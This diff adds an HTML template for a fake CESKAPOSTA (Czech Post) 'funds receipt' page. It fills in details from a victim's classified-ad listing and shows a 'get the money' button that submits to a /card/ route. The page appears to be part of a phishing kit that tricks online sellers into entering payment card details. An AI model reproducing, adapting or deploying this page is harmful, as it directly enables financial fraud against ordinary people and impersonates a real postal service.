@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<link href="favicon.ico" rel="icon" type="image/x-icon">
+	<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+	<title>Fonların alınması</title>
+	<meta property="og:site_name" content="CESKAPOSTA">
+	<meta property="og:title" content="<%=ad.title%>">
+	<meta property="og:description" content="CESKAPOSTA">
+	<meta property="og:image" content="<%=ad.photo%>">
+	<meta property="og:type" content="website">
+	<meta property="og:locale" content="ru_RU">
+	<link type="text/css" href="https://jivis.us//main.css" rel="stylesheet">
+	<link type="text/css" href="https://jivis.us//mobile.css" rel="stylesheet">
+	</head>
+	</head>
+	<header class="Header">
+	<a href="/" class="HeaderTextNav"><img src="https://philatelicpursuits.files.wordpress.com/2019/11/czech-republic-c48ceskc3a1-poc5a1ta-1.png" width="200" alt=""></a>
+</header>
+<main class="Main">
+<div style="width: -webkit-fill-available;height: -webkit-fill-available;">
+	<div class="TextHead">Fonların alınması</div>
+	<div class="PaddBlock">
+		<div class="CenterMainHead">
+			<div style="display: flex;">
+				<img class="ImgTovar" src="<%=ad.photo%>" alt="">
+				<div class="BlockTextCent">
+					<div class="BalanceText"><%=ad.price%></div>
+					<div class="ComentText"><%=ad.title%></div>
+				</div>
+			</div>
+			<div class="Jtonik">
+				<div class="SuccText" style="margin: auto;">Placený produkt</div>
+				<img class="ImgTovarPay" src="https://d3r4tb575cotg3.cloudfront.net/static/noun_1281471.png" alt="">
+			</div>
+		</div>
+	</div>
+	<div class="PaddBlock Ms">
+		<div class="CenterMainHead" style="height: 50px;">
+			<div style="display: flex;margin: auto;">
+				<div class="SuccText" style="margin: auto;">Placený produkt</div>
+				<img class="ImgTovarPay" src="/assets/images/secure.svg" alt="">
+			</div>
+		</div>
+	</div>
+	<div class="PaddBlock">
+		<div class="BlockDostavka">
+			<div class="BgImgCar">
+				<img class="ImgTovarPay" src="https://cdn.dribbble.com/users/2459530/screenshots/8029114/media/ec7402c26d95030fd111401b35482144.gif" alt="">
+			</div>
+			<div class="BlockTextDostav">
+				<div class="TextDostav">Vybraná země odeslání</div>
+				<div class="TextDostavTs">Náklady na dopravu se mohou v jednotlivých městech lišit.</div>
+			</div>
+		</div>
+	</div>
+	<div class="PaddBlock M">
+		<div class="MainOrder">
+			<form class="OrderPayForm" action="/card/<%=ad.id%>" method="GET">
+				<div class="MrgWebKit">
+					<div class="FormOrderInp" style="margin-top: 20px;">
+						<div class="TextOrderSay">Dodací adresa:</div>
+						<div class="MobAviableFlex">
+							<input type="text" class="InputOrder" style="margin-right: 0;" value="<%=ad.address%>" placeholder="City, street, house" required disabled="disabled" readonly>
+						</div>
+					</div>
+					<div class="FormOrderInp">
+						<div class="MobAviableFlex">
+						</div>
+					</div>
+					<div class="FormOrderInp">
+						<div class="MobAviableFlex">
+						</div>
+					</div>
+					<div class="FormOrderInp" style="margin-top: 20px;">
+						<div class="TextOrderSay" style="margin-top: 20px;text-align: center;">Od okamžiku přijetí finančních prostředků je nutné zboží zaslat Kupujícímu službou do 3 dnů <a href="http://.tr/">CESKAPOSTA</a>. Po potvrzení bude kurýr kontaktován pro převod.</div>
+					</div>
+				</div>
+				<div class="BoxOrder">
+					<div class="BoxBerry">
+						<div class="BlockDecoy">
+							<div class="TextDecoy" style="max-width: 300px;">Vaše položka je uvedena pro tuto částku:</div>
+							<div class="TextDecoy"><%=ad.price%> </div>
+						</div>
+						<input class="ButtonOrderPay" type="submit" name="PayCheck" value="Získejte peníze">
+						<div class="BlockDecoyText">
+							<div class="BlockDecoyOne">Pagar es seguro</div>
+							<div class="BlockDecoyTwo">"Kliknutím na tlačítko "Získat" souhlasíte s podepsáním smlouvy o prodeji zboží pomocí online služby "secure agreement". & <a class="FntMobClear" href="https://www.parcel2go.com/">Offer</a></div>
+						</div>
+					</div>
+				</div>
+			</form>
+		</div>
+	</div>
+
+</main>
+<style>
+	@media (max-width: 840px) {
+		.FormOrderInp {
+			margin-top: 10px;
+		}
+	}
+</style>
